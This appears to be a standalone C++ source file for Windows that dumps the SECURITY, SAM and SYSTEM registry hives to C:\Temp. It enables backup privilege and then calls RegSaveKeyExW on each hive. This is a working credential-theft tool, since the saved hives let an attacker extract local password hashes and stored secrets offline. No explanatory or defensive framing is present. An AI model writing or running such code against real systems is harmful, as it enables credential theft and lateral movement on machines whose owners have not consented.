#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <winreg.h>
#pragma comment(lib, "advapi32.lib")
HKEY KeySec;
HKEY KeySam;
HKEY KeySys;

BOOL EnableBackupPrivilege()
{
	HANDLE hToken = NULL;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;

	TOKEN_PRIVILEGES tkp;
	LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bOk = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
	CloseHandle(hToken);

	return bOk;

}

LSTATUS KeyTSec = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &KeySec);
LSTATUS KeyTSam = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &KeySam);
LSTATUS KeyTSys = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &KeySys);

int main() {
	std::cout << EnableBackupPrivilege() << std::endl;
	std::cout << KeyTSec << std::endl;
	std::cout << RegSaveKeyExW(KeySec, L"c:\\Temp\\Security", NULL, 1) << std::endl;
	std::cout << RegCloseKey(KeySec);
	std::cout << KeyTSam << std::endl;
	std::cout << RegSaveKeyExW(KeySam, L"c:\\Temp\\Sam", NULL, 1) << std::endl;
	std::cout << RegCloseKey(KeySam);
	std::cout << KeyTSys << std::endl;
	std::cout << RegSaveKeyExW(KeySys, L"c:\\Temp\\System", NULL, 1) << std::endl;
	std::cout << RegCloseKey(KeySys);
	return 0;
}
